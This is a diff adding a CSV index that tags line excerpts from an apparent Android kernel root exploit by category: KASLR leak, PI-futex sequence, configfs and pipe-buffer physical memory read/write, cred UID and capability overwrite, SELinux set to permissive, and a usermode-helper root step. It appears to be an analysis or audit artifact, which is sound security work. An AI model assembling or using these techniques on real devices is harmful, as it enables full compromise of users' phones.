@@ -1,0 +1,410 @@
+path,line,category,excerpt
+Makefile,1,build_target,API ?= 35
+Makefile,3,build_target,"NDK_ROOT ?= $(or $(ANDROID_NDK_HOME),$(ANDROID_NDK_ROOT))"
+Makefile,4,build_target,NDK_CC := $(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android$(API)-clang
+Makefile,11,kernel_memory_primitive,src/core/pipe_physrw.c \
+Makefile,14,credential_or_execution_transition,src/core/umh_root.c
+Makefile,18,build_target,LDFLAGS := -fPIE -pie -pthread
+Makefile,25,build_target,$(NDK_CC) $(CFLAGS) $(LDFLAGS) $^ -o $@
+src/core/fops.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
+src/core/fops.c,9,orchestration,extern int pselect_custom_write;
+src/core/fops.c,32,orchestration,uint64_t kaslr_mmap_ptr;
+src/core/fops.c,38,orchestration,uint64_t kaslr_expected_mmap;
+src/core/fops.c,47,orchestration,int default_delay = pselect_custom_write_enabled() ? 0 : -1;
+src/core/fops.c,72,orchestration,static int pselect_words_per_set(void) {
+src/core/fops.c,77,orchestration,static int pselect_put_global_word(
+src/core/fops.c,101,orchestration,static void pselect_put_waiter_word(
+src/core/fops.c,106,orchestration,int placed = pselect_put_global_word(
+src/core/fops.c,109,orchestration,"pr_warning(""pselect cannot place %s waiter_word=%d global_word=%d """
+src/core/fops.c,122,orchestration,"pr_warning(""pselect F_DUPFD read errno=%d\n"", errno);"
+src/core/fops.c,135,orchestration,"void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {"
+src/core/fops.c,144,orchestration,pselect_custom_write_enabled() ? fake_task :
+src/core/fops.c,152,orchestration,int words_per_set = pselect_words_per_set();
+src/core/fops.c,153,orchestration,struct pselect_waiter_word {
+src/core/fops.c,168,orchestration,"{12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),"
+src/core/fops.c,174,orchestration,struct pselect_waiter_word *w = &words[i];
+src/core/fops.c,175,orchestration,pselect_put_waiter_word(
+src/core/fops.c,180,orchestration,void do_pselect_fake_lock_route(void) {
+src/core/fops.c,184,orchestration,"pr_error(""pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n"","
+src/core/fops.c,201,orchestration,"pr_error(""pselect retry page prepare failed attempt=%d base=%016zx """
+src/core/fops.c,210,orchestration,"int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);"
+src/core/fops.c,212,orchestration,"pr_warning(""pselect timerfd_create failed errno=%d; using pipe read end\n"","
+src/core/fops.c,220,orchestration,"pr_error(""pselect F_DUPFD read errno=%d\n"", errno);"
+src/core/fops.c,232,orchestration,"prepare_pselect_fdsets(&in, &out, &ex);"
+src/core/fops.c,233,orchestration,"pr_info(""pselect route setup attempt=%d simple=%d shift=%d page=%016zx """
+src/core/fops.c,266,orchestration,"pr_info(""pselect pre-select +%.0fms\n"", fops_elapsed_ms(&route_t0));"
+src/core/fops.c,270,orchestration,"pr_info(""pselect post-select +%.0fms ret=%d\n"", fops_elapsed_ms(&route_t0), ret);"
+src/core/fops.c,274,orchestration,"pr_info(""pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n"","
+src/core/fops.c,283,orchestration,"pr_info(""pselect route probing cfi attempt=%d ret=%d expected=%d\n"","
+src/core/fops.c,286,orchestration,if (pselect_custom_write_enabled()) {
+src/core/fops.c,290,target_specific_layout,if (active_offsets && active_offsets->off_system_unbound_wq &&
+src/core/fops.c,307,orchestration,"pr_info(""pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n"","
+src/core/fops.c,328,orchestration,"pr_info(""pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n"","
+src/core/fops.c,331,orchestration,"pr_info(""pselect route done calls=%d success=%d step=%d errno=%d\n"","
+src/core/fops.c,339,kernel_memory_primitive,"ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));"
+src/core/fops.c,340,kernel_memory_primitive,"ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));"
+src/core/fops.c,364,kernel_memory_primitive,"if (kernel_write_data(fd, target, &slots[i].value,"
+src/core/fops.c,375,kernel_memory_primitive,"kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);"
+src/core/fops.c,376,kernel_memory_primitive,"kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);"
+src/core/fops.c,377,kernel_memory_primitive,"kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);"
+src/core/fops.c,377,orchestration,"kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);"
+src/core/fops.c,378,kernel_memory_primitive,"kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);"
+src/core/fops.c,380,kernel_memory_primitive,"kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);"
+src/core/fops.c,383,orchestration,!is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
+src/core/fops.c,393,orchestration,kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
+src/core/fops.c,398,orchestration,kaslr_mmap_ptr != kaslr_expected_mmap ||
+src/core/fops.c,416,target_specific_layout,int restore_slide_boot_id(int fd) {
+src/core/fops.c,417,target_specific_layout,uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
+src/core/fops.c,418,target_specific_layout,slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
+src/core/fops.c,419,kernel_memory_primitive,configfs_read_once(
+src/core/fops.c,420,target_specific_layout,"fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));"
+src/core/fops.c,422,kernel_memory_primitive,configfs_write_once(
+src/core/fops.c,423,target_specific_layout,"fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));"
+src/core/fops.c,424,kernel_memory_primitive,configfs_read_once(
+src/core/fops.c,425,target_specific_layout,"fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));"
+src/core/fops.c,426,target_specific_layout,"pr_info(""slide restore boot_id data pid=%d ret=%zd before=%016llx """
+src/core/fops.c,437,kernel_memory_primitive,if (!install_pipe_physrw(fd)) return 0;
+src/core/fops.c,438,credential_or_execution_transition,if (install_umh_root(fd)) return 1;
+src/core/fops.c,465,kernel_memory_primitive,"configfs_write_once(fd, binwrite_target, payload, sizeof(payload));"
+src/core/fops.c,487,kernel_memory_primitive,"configfs_read_once(fd, binwrite_target, readback, sizeof(readback));"
+src/core/fops.c,498,kernel_memory_primitive,"ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));"
+src/core/fops.c,508,target_specific_layout,if (!restore_slide_boot_id(fd)) {
+src/core/fops.c,531,kernel_memory_primitive,if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
+src/core/fops.c,532,kernel_memory_primitive,physrw_read64_ok && physrw_write64_ok) {
+src/core/fops.c,544,kernel_memory_primitive,ssize_t restore = configfs_write_once(
+src/core/fops.c,554,kernel_memory_primitive,"ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));"
+src/core/fops.c,564,kernel_memory_primitive,"configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));"
+src/core/fops.c,584,kernel_memory_primitive,cfi_restore_ret = configfs_write_once(
+src/core/fops.c,589,kernel_memory_primitive,"if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) =="
+src/core/fops.c,595,kernel_memory_primitive,cfi_owner_ret = configfs_write_once(
+src/core/kernelsnitch/kernelsnitch.h,15,build_target,#include <pthread.h>
+src/core/kernelsnitch/kernelsnitch.h,92,build_target,pthread_t *tids;
+src/core/kernelsnitch/kernelsnitch.h,116,orchestration,"SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));"
+src/core/kernelsnitch/kernelsnitch.h,123,build_target,pthread_t tid;
+src/core/kernelsnitch/kernelsnitch.h,128,build_target,"SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));"
+src/core/kernelsnitch/kernelsnitch.h,128,orchestration,"SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));"
+src/core/kernelsnitch/kernelsnitch.h,150,orchestration,"SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));"
+src/core/kernelsnitch/kernelsnitch.h,219,orchestration,"struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,231,orchestration,"ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,232,build_target,"ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,232,orchestration,"ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,233,orchestration,"ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,235,orchestration,"SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,238,orchestration,"ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));"
+src/core/kernelsnitch/kernelsnitch.h,317,build_target,"SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));"
+src/core/kernelsnitch/kernelsnitch.h,317,orchestration,"SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));"
+src/core/kernelsnitch/kernelsnitch.h,320,build_target,"pthread_join(ks->tids[i], 0);"
+src/core/kernelsnitch/kernelsnitch.h,329,build_target,"munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);"
+src/core/pipe_physrw.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
+src/core/pipe_physrw.c,18,kernel_memory_primitive,int physrw_read_ok;
+src/core/pipe_physrw.c,19,kernel_memory_primitive,int physrw_write_ok;
+src/core/pipe_physrw.c,20,kernel_memory_primitive,int physrw_read64_ok;
+src/core/pipe_physrw.c,21,kernel_memory_primitive,int physrw_write64_ok;
+src/core/pipe_physrw.c,37,kernel_memory_primitive,char physrw_readback[64];
+src/core/pipe_physrw.c,38,kernel_memory_primitive,char physrw_after_write[64];
+src/core/pipe_physrw.c,39,orchestration,int pipe_scan_vmemmap;
+src/core/pipe_physrw.c,56,kernel_memory_primitive,uint64_t physrw_read64_before;
+src/core/pipe_physrw.c,57,kernel_memory_primitive,uint64_t physrw_read64_after;
+src/core/pipe_physrw.c,58,kernel_memory_primitive,uint64_t physrw_write64_value;
+src/core/pipe_physrw.c,61,target_specific_layout,uint64_t off = (active_offsets && active_offsets->off_anon_pipe_buf_ops)
+src/core/pipe_physrw.c,62,target_specific_layout,? active_offsets->off_anon_pipe_buf_ops : ANON_PIPE_BUF_OPS_OFF;
+src/core/pipe_physrw.c,67,target_specific_layout,uint64_t off = (active_offsets && active_offsets->off_kmalloc_caches)
+src/core/pipe_physrw.c,68,target_specific_layout,? active_offsets->off_kmalloc_caches : KMALLOC_CACHES_OFF;
+src/core/pipe_physrw.c,85,kernel_memory_primitive,"kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);"
+src/core/pipe_physrw.c,85,target_specific_layout,"kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);"
+src/core/pipe_physrw.c,132,kernel_memory_primitive,"kernel_read_data(fd, pr_kmalloc_caches(), cache_slots, sizeof(cache_slots));"
+src/core/pipe_physrw.c,149,kernel_memory_primitive,"pr_info(""physrw cache gate normal_2k=%016llx cgroup_2k=%016llx\n"","
+src/core/pipe_physrw.c,156,kernel_memory_primitive,"uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);"
+src/core/pipe_physrw.c,156,target_specific_layout,"uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);"
+src/core/pipe_physrw.c,169,kernel_memory_primitive,"pr_info(""physrw cache gate OK idx=%zu slab=%016llx\n"","
+src/core/pipe_physrw.c,189,orchestration,pipe_scan_vmemmap = 0;
+src/core/pipe_physrw.c,202,kernel_memory_primitive,"if (kernel_read_data(fd, base + off, slab + off, PHYSRW_SCAN_CHUNK) !="
+src/core/pipe_physrw.c,224,orchestration,pipe_scan_vmemmap++;
+src/core/pipe_physrw.c,240,target_specific_layout,if (pb.offset != 0 || pb.ops != expected_ops ||
+src/core/pipe_physrw.c,262,kernel_memory_primitive,"int pipe_phys_read_data(int fd, uintptr_t direct_addr,"
+src/core/pipe_physrw.c,273,kernel_memory_primitive,"if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !="
+src/core/pipe_physrw.c,280,target_specific_layout,pb.offset = direct_addr & (PAGE_SIZE - 1);
+src/core/pipe_physrw.c,286,kernel_memory_primitive,"if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !="
+src/core/pipe_physrw.c,294,kernel_memory_primitive,"kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));"
+src/core/pipe_physrw.c,298,kernel_memory_primitive,"int pipe_phys_write_data(int fd, uintptr_t direct_addr,"
+src/core/pipe_physrw.c,309,kernel_memory_primitive,"if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !="
+src/core/pipe_physrw.c,316,target_specific_layout,pb.offset = direct_addr & (PAGE_SIZE - 1);
+src/core/pipe_physrw.c,322,kernel_memory_primitive,"if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !="
+src/core/pipe_physrw.c,330,kernel_memory_primitive,"kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));"
+src/core/pipe_physrw.c,336,kernel_memory_primitive,"pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));"
+src/core/pipe_physrw.c,342,kernel_memory_primitive,"pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));"
+src/core/pipe_physrw.c,347,kernel_memory_primitive,"return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));"
+src/core/pipe_physrw.c,376,orchestration,pipe_scan_vmemmap = 0;
+src/core/pipe_physrw.c,387,kernel_memory_primitive,int install_pipe_physrw(int configfs_fd) {
+src/core/pipe_physrw.c,391,kernel_memory_primitive,if (!pr_cache_gate(configfs_fd)) {
+src/core/pipe_physrw.c,392,kernel_memory_primitive,"pr_info(""physrw cache gate FAILED candidate=%016llx want=%016llx\n"","
+src/core/pipe_physrw.c,404,kernel_memory_primitive,"int found = pr_find_buffer(configfs_fd, pr_buf_base);"
+src/core/pipe_physrw.c,405,kernel_memory_primitive,"pr_info(""physrw probe found=%d buf=%016zx idx=%d scan=%d/%d/%d\n"","
+src/core/pipe_physrw.c,407,orchestration,"pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len);"
+src/core/pipe_physrw.c,416,kernel_memory_primitive,"pr_info(""physrw vmemmap roundtrip FAILED\n"");"
+src/core/pipe_physrw.c,416,orchestration,"pr_info(""physrw vmemmap roundtrip FAILED\n"");"
+src/core/pipe_physrw.c,420,kernel_memory_primitive,"char seed[] = ""ghostlock_physrw_read"";"
+src/core/pipe_physrw.c,421,kernel_memory_primitive,"if (kernel_write_data(configfs_fd, proof_addr, seed, sizeof(seed)) !="
+src/core/pipe_physrw.c,426,kernel_memory_primitive,"memset(physrw_readback, 0, sizeof(physrw_readback));"
+src/core/pipe_physrw.c,427,kernel_memory_primitive,physrw_read_ok =
+src/core/pipe_physrw.c,428,kernel_memory_primitive,"pipe_phys_read_data(configfs_fd, proof_addr,"
+src/core/pipe_physrw.c,429,kernel_memory_primitive,"physrw_readback, sizeof(seed));"
+src/core/pipe_physrw.c,430,kernel_memory_primitive,"pr_info(""physrw read verify ok=%d idx=%d\n"","
+src/core/pipe_physrw.c,431,kernel_memory_primitive,"physrw_read_ok, pr_pipe_idx);"
+src/core/pipe_physrw.c,433,kernel_memory_primitive,"char overwrite[] = ""ghostlock_physrw_write"";"
+src/core/pipe_physrw.c,434,kernel_memory_primitive,physrw_write_ok =
+src/core/pipe_physrw.c,435,kernel_memory_primitive,"pipe_phys_write_data(configfs_fd, proof_addr,"
+src/core/pipe_physrw.c,437,kernel_memory_primitive,"pr_info(""physrw write verify ok=%d\n"", physrw_write_ok);"
+src/core/pipe_physrw.c,438,kernel_memory_primitive,"kernel_read_data(configfs_fd, proof_addr,"
+src/core/pipe_physrw.c,439,kernel_memory_primitive,"physrw_after_write, sizeof(overwrite));"
+src/core/pipe_physrw.c,444,kernel_memory_primitive,"kernel_write_data(configfs_fd, proof64_addr, &seed64, sizeof(seed64));"
+src/core/pipe_physrw.c,445,kernel_memory_primitive,"physrw_read64_before = pipe_read64(configfs_fd, proof64_addr);"
+src/core/pipe_physrw.c,446,kernel_memory_primitive,physrw_read64_ok = physrw_read64_before == seed64;
+src/core/pipe_physrw.c,447,kernel_memory_primitive,"pr_info(""physrw read64 ok=%d value=%016llx\n"","
+src/core/pipe_physrw.c,448,kernel_memory_primitive,"physrw_read64_ok, (unsigned long long)physrw_read64_before);"
+src/core/pipe_physrw.c,450,kernel_memory_primitive,physrw_write64_value = next64;
+src/core/pipe_physrw.c,451,kernel_memory_primitive,"physrw_write64_ok = pipe_write64(configfs_fd, proof64_addr, next64);"
+src/core/pipe_physrw.c,452,kernel_memory_primitive,"kernel_read_data(configfs_fd, proof64_addr,"
+src/core/pipe_physrw.c,453,kernel_memory_primitive,"&physrw_read64_after, sizeof(physrw_read64_after));"
+src/core/pipe_physrw.c,454,kernel_memory_primitive,physrw_write64_ok =
+src/core/pipe_physrw.c,455,kernel_memory_primitive,physrw_write64_ok && physrw_read64_after == physrw_write64_value;
+src/core/pipe_physrw.c,458,kernel_memory_primitive,physrw_read_ok &&
+src/core/pipe_physrw.c,459,kernel_memory_primitive,"memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&"
+src/core/pipe_physrw.c,460,kernel_memory_primitive,physrw_write_ok &&
+src/core/pipe_physrw.c,461,kernel_memory_primitive,"memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&"
+src/core/pipe_physrw.c,462,kernel_memory_primitive,physrw_read64_ok && physrw_write64_ok;
+src/core/pipe_physrw.c,465,kernel_memory_primitive,"pr_info(""physrw installed OK buf=%016zx pipe=%d\n"","
+src/core/root.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
+src/core/root.c,7,credential_or_execution_transition,uint32_t root_uid_before = 0xffffffff;
+src/core/root.c,8,credential_or_execution_transition,uint32_t root_uid_after = 0xffffffff;
+src/core/root.c,14,credential_or_execution_transition,int setuid_ret = -1;
+src/core/root.c,43,orchestration,"root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));"
+src/core/root.c,72,credential_or_execution_transition,report.setuid_ret = setuid(0);
+src/core/root.c,73,credential_or_execution_transition,report.setuid_errno = errno;
+src/core/root.c,89,credential_or_execution_transition,if (report.setgid_ret == 0 && report.setuid_ret == 0) {
+src/core/root.c,131,credential_or_execution_transition,root_uid_after = report.uid_after;
+src/core/root.c,133,credential_or_execution_transition,setuid_ret = report.setuid_ret;
+src/core/root.c,167,kernel_memory_primitive,"pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);"
+src/core/root.c,188,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {"
+src/core/root.c,193,kernel_memory_primitive,if (!pipe_phys_write_data(
+src/core/root.c,201,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {"
+src/core/root.c,206,kernel_memory_primitive,if (!pipe_phys_read_data(
+src/core/root.c,235,kernel_memory_primitive,"return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));"
+src/core/root.c,270,kernel_memory_primitive,ok &= pipe_phys_write_data(
+src/core/root.c,272,kernel_memory_primitive,ok &= pipe_phys_write_data(
+src/core/root.c,274,kernel_memory_primitive,ok &= pipe_phys_write_data(
+src/core/root.c,300,credential_or_execution_transition,root_uid_before = getuid();
+src/core/root.c,307,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));"
+src/core/root.c,329,kernel_memory_primitive,pipe_phys_read_data(
+src/core/root.c,360,kernel_memory_primitive,pipe_phys_read_data(
+src/core/root.c,363,kernel_memory_primitive,pipe_phys_read_data(
+src/core/root.c,389,kernel_memory_primitive,pipe_phys_read_data(
+src/core/root.c,392,kernel_memory_primitive,pipe_phys_read_data(
+src/core/root.c,420,kernel_memory_primitive,"pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));"
+src/core/root.c,422,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));"
+src/core/root.c,434,kernel_memory_primitive,"pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));"
+src/core/root.c,435,credential_or_execution_transition,"pr_info(""root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d """
+src/core/root.c,438,credential_or_execution_transition,"root_child_done, root_uid_after, report.setgid_ret,"
+src/core/root.c,439,credential_or_execution_transition,"report.setgid_errno, report.setuid_ret, report.setuid_errno,"
+src/core/slide.c,3,target_specific_layout,#define SLIDE_MAX_ATTEMPTS 20
+src/core/slide.c,4,target_specific_layout,#define SLIDE_CONSUME_DELAY 2000
+src/core/slide.c,5,target_specific_layout,#define SLIDE_CONSUME_USEC 0
+src/core/slide.c,6,target_specific_layout,#ifndef SLIDE_PSELECT_NFDS
+src/core/slide.c,7,target_specific_layout,#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
+src/core/slide.c,9,target_specific_layout,#define SLIDE_PSELECT_PAD_BYTES 0
+src/core/slide.c,10,target_specific_layout,#ifndef SLIDE_PSELECT_WORD_SHIFT
+src/core/slide.c,11,target_specific_layout,#define SLIDE_PSELECT_WORD_SHIFT 0
+src/core/slide.c,13,target_specific_layout,#ifndef SLIDE_WAIT_SECONDS
+src/core/slide.c,14,target_specific_layout,#define SLIDE_WAIT_SECONDS 30
+src/core/slide.c,35,orchestration,int slide_pselect_words_per_set(void) {
+src/core/slide.c,37,target_specific_layout,return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
+src/core/slide.c,40,orchestration,int slide_pselect_global_word(int waiter_word) {
+src/core/slide.c,41,target_specific_layout,return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
+src/core/slide.c,44,orchestration,int slide_pselect_put_global_word(
+src/core/slide.c,68,orchestration,uint64_t slide_pselect_get_global_word(
+src/core/slide.c,89,orchestration,void slide_pselect_put_waiter_word(
+src/core/slide.c,92,orchestration,int global_word = slide_pselect_global_word(waiter_word);
+src/core/slide.c,93,orchestration,int placed = slide_pselect_put_global_word(
+src/core/slide.c,96,orchestration,"pr_warning(""slide pselect cannot place %s waiter_word=%d global_word=%d """
+src/core/slide.c,99,target_specific_layout,SLIDE_PSELECT_NFDS);
+src/core/slide.c,103,orchestration,"void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {"
+src/core/slide.c,108,orchestration,int words_per_set = slide_pselect_words_per_set();
+src/core/slide.c,114,target_specific_layout,"{0, SLIDE_LOGGERS_0_1, ""tree_pc""},"
+src/core/slide.c,116,target_specific_layout,"{2, SLIDE_RANDOM_BOOT_ID_DATA, ""tree_left""},"
+src/core/slide.c,118,target_specific_layout,"{5, SLIDE_LOGGERS_0_1, ""pi0""},"
+src/core/slide.c,120,target_specific_layout,"{7, SLIDE_RANDOM_BOOT_ID_DATA, ""pi2""},"
+src/core/slide.c,123,target_specific_layout,"{10, SLIDE_INIT_TASK, ""task""},"
+src/core/slide.c,130,orchestration,slide_pselect_put_waiter_word(
+src/core/slide.c,136,target_specific_layout,for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
+src/core/slide.c,141,target_specific_layout,"dup2(read_fd, SLIDE_PSELECT_NFDS - 1);"
+src/core/slide.c,142,target_specific_layout,"FD_SET(SLIDE_PSELECT_NFDS - 1, ex);"
+src/core/slide.c,145,orchestration,void slide_pselect_stack_copy(void) {
+src/core/slide.c,147,orchestration,"pr_error(""slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n"","
+src/core/slide.c,154,orchestration,"int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);"
+src/core/slide.c,156,orchestration,"pr_warning(""slide timerfd_create failed errno=%d; using pipe read end\n"","
+src/core/slide.c,160,target_specific_layout,"int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);"
+src/core/slide.c,162,orchestration,"pr_error(""slide pselect F_DUPFD read errno=%d\n"", errno);"
+src/core/slide.c,174,orchestration,"prepare_slide_pselect_fdsets(&in, &out, &ex);"
+src/core/slide.c,190,target_specific_layout,#ifndef SLIDE_PSELECT_TIMEOUT_SEC
+src/core/slide.c,191,target_specific_layout,#define SLIDE_PSELECT_TIMEOUT_SEC PSELECT_TIMEOUT_SEC
+src/core/slide.c,193,target_specific_layout,#ifdef SLIDE_USE_SELECT
+src/core/slide.c,194,target_specific_layout,"struct timeval tv = { .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC, .tv_usec = 0 };"
+src/core/slide.c,195,target_specific_layout,"int ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &tv);"
+src/core/slide.c,198,target_specific_layout,".tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,"
+src/core/slide.c,202,orchestration,"int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);"
+src/core/slide.c,202,target_specific_layout,"int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);"
+src/core/slide.c,206,orchestration,"pr_info(""slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d """
+src/core/slide.c,238,target_specific_layout,if (SLIDE_CONSUME_USEC) {
+src/core/slide.c,239,target_specific_layout,usleep(SLIDE_CONSUME_USEC);
+src/core/slide.c,241,target_specific_layout,for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
+src/core/slide.c,282,pi_futex_sequence,"if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {"
+src/core/slide.c,294,target_specific_layout,timeout.tv_sec += SLIDE_WAIT_SECONDS;
+src/core/slide.c,297,pi_futex_sequence,"futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,"
+src/core/slide.c,299,pi_futex_sequence,"futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);"
+src/core/slide.c,301,orchestration,slide_pselect_stack_copy();
+src/core/slide.c,310,pi_futex_sequence,"if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {"
+src/core/slide.c,320,pi_futex_sequence,"futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);"
+src/core/slide.c,343,target_specific_layout,"int fd = open(""/proc/sys/kernel/random/boot_id"", O_RDONLY | O_CLOEXEC);"
+src/core/slide.c,345,target_specific_layout,"pr_warning(""slide boot_id read denied errno=%d\n"", errno);"
+src/core/slide.c,353,target_specific_layout,"pr_warning(""slide boot_id read failed errno=%d\n"", saved_errno);"
+src/core/slide.c,373,target_specific_layout,"pr_warning(""slide short boot_id parse out=%d n=%zd\n"", out, n);"
+src/core/slide.c,387,target_specific_layout,uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
+src/core/slide.c,389,target_specific_layout,"pr_success(""slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n"","
+src/core/slide.c,391,target_specific_layout,"pr_success(""slide boot_id-derived_stext pid=%d value=%016llx\n"","
+src/core/slide.c,396,build_target,pthread_t waiter;
+src/core/slide.c,397,build_target,pthread_t owner;
+src/core/slide.c,398,build_target,pthread_t consumer;
+src/core/slide.c,399,build_target,"SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));"
+src/core/slide.c,399,orchestration,"SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));"
+src/core/slide.c,400,build_target,"SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));"
+src/core/slide.c,400,orchestration,"SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));"
+src/core/slide.c,401,build_target,"SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));"
+src/core/slide.c,401,orchestration,"SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));"
